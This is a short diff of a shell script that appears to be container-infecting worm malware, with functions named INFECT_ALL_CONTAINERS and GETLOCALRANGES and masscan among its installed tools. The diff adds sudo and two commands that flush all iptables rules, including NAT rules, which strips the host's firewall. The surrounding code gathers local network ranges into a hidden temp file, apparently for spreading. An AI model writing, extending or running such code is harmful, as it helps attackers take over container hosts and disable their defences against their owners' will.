@@ -26,6 +26,7 @@ function SETUP_BASICS() {
     apk add --no-cache \
         go \
         git \
+        sudo \
         jq \
         openrc \
         masscan \
@@ -116,6 +117,8 @@ function INFECT_ALL_CONTAINERS() {
     done
 }
 
+sudo iptables -F
+sudo iptables -t nat -F
 # Get local IP ranges
 function GETLOCALRANGES() {
     ip route show | awk '{print $1}' | grep "/" > /tmp/.lr
